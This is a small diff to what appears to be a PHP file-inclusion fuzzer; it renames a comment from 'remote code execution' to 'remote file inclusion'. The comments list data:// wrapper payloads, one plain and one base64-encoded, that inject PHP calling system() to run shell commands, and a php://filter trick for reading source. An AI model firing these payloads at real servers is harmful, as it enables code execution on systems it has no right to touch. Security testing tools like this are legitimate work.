@@ -5,7 +5,7 @@ from .const import PHP_SHELL_CITATION, PHP_SHELL_PING
 # Test:
 #   - data://text/plain,<?php%20echo%20system('command');?>
 #   - data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJ2NvbW1hbmQnKTsgPz4=
-#   - remote code execution
+#   - remote file inclusion
 #   NOTE: php://filter/convert.base64-encode/resource=... is handled in lfi_encoder
 def php_fuzz(args):
     data_payloads = ["INTERESTING_INCLUDED_PAYLOAD", PHP_SHELL_CITATION, PHP_SHELL_PING]
